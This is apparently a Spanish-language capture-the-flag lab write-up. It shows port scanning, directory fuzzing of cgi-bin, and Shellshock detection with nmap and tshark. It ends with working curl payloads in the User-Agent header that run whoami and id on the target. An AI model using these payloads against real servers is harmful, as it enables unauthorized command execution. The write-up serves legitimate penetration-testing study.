```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.55.91 -oG allPorts
```

```shell
nmap -p80,2222 -sCV -vvv 10.129.55.91 -oN targeted
```

Encontramos abiertos los puertos `80` con una *web* y `2222` con un *ssh*
Navegaremos a la web para obtener información sobre ella
Primero veremos que alberga la web en búsqueda de las tecnologías que usa
```shell
whatweb http://10.129.55.91
```

Al navegar a la web encontramos el siguiente contenido
![[Pasted image 20260907204851.png]]

Vamos hacer fuzzing sobre la web en búsqueda de subdirectorios usaremos primero los scripts de [[NMAP]]
```shell
nmap -p80 --script http-enum 10.129.55.91
```

No encontramos nada relevante, seguiremos haciendo fuzzng con otras herramientas como [[FFUF]]
```shell
ffuf -c -fc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.55.91/FUZZ
```

Al no encontrar ninguna coincidencia puede ser que el servidor este rechazando así que incluiremos una `/` al final del `FUZZ`
```shell
ffuf -c -fc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.55.91/FUZZ/
```

Encontrando correspondencias como: `cgi-bin`, `icons` y `server-status`con código de estado *403*
Al ver `cgi-bin` buscaremos en Internet que es, y descubrimos que es una carpeta que se encuentra en un servidor web con la capacidad de almacenar scripts *CGI (Common Gateway Interface)* ejecutables. Aloja script con extensión `.pl`, `.pm`,  `.cgi`, `.py`, `.php` , `.sh` así que procederemos a hacer un fuzzing en búsqueda de esos archivos.
```shell
ffuf -c -fc 404 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u http://10.129.55.91/cgi-bin/FUZZ -e .pl,.pm,.cgi,.php,.py
```

Encontrando un archivo llamado `user.sh`, navegaremos a el para ver de que se trata
![[Pasted image 20260907215801.png]]

Vemos que es un script dinámico ya que el contenido va cambiando
![[Pasted image 20260907220130.png]]

Al haber u *CGI-BIN*, podemos probar a realizar un ataque *ShellShock*, para validar que esta vulnerabilidad se esta aconteciendo, podemos usa [[NMAP]]
```shell
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.55.231
```

Devolviéndonos como respuesta que es vulnerable a esta vulnerabilidad
Para explotar esta vulnerabilidad, primero nos tendremos que poner en escucha e identificar el campo vulnerable después de ejecutar el validador de [[NMAP]] primero usaremos  [[TSHARK]]
```shell
tshark -w Captura.cap -i tun0
```

Y a continuación
```shell
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.55.231
```

Obteniendo una captura de red almacenada en el archivo `Captura.cap`, la analizaremos usando
```shell
tshark -r Captura.cap -Y 'http' 2>/dev/null
```

Observamos que se ha emitido un *GET* a `cgi-bin/user.sh`, así que convertiremos la información a *JSON* para poder analizarlo con mas detenimiento
```shell
tshark -r Captura.cap -Y 'http' -Tjson  2>/dev/null
```

El campo que nos interesa analizar es el *tcp.payload*
```shell
tshark -r Captura.cap -Y 'http' -Tfields -e 'tcp.payload' 2>/dev/null
```

Obtendremos el campo en formato hexadecimal y lo transformaremos a texto legible
```shell
tshark -r Captura.cap -Y 'http' -Tfields -e 'tcp.payload' 2>/dev/null | xxd -ps -r; echo
```

![[Pasted image 20260909124139.png]]

Observamos estas cabecera *User-Agent*, *Referer*, *Cookie* ya que cuando *Apache* ejecuta un *CGI* se pueden usar determinados headers HTTP para ser convertidas en variables de entorno para el proceso *CGI*. Si la *bash* ejecutada en la maquina victima en `/cgi-bin/user.sh` es una versión vulnerable, el contenido de las variables que se crean con los *headers* podría acabar siendo interpretado por la *bash*.

Lo que tendremos que probar ahora es a realizar peticiones con [[CURL]] modificando las cabeceras en búsqueda de respuestas diferentes.
```shell
curl -s -X GET "http://10.129.55.231/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/whoami"
```

En este caso al modificar la cabecera de *User-Agent* hemos conseguido ejecutar un `whoami` en la maquina victima obteniendo el nombre de un usuario llamado *Shelly*.
![[Pasted image 20260909130031.png]]

Por lo que se nos desvela que tenemos ejecucion remota de comandos lo podemos validar usando otro comando como puede ser `id`
```shell
curl -s -X GET "http://10.129.55.231/cgi-bin/user.sh" -H "User-Agent: () { :; };echo; /usr/bin/id"
```

![[Pasted image 20260909130106.png]]


